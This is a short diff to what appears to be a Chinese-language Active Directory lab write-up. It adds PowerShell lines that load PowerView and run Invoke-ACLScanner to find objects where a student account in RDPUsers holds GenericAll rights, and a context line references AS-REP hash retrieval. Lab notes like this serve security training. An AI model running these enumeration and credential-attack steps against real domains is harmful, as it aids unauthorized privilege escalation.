@@ -164,7 +164,8 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
 ```
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights
 
 bjectDN                                                       ActiveDirectoryRights
 --------                                                       ---------------------
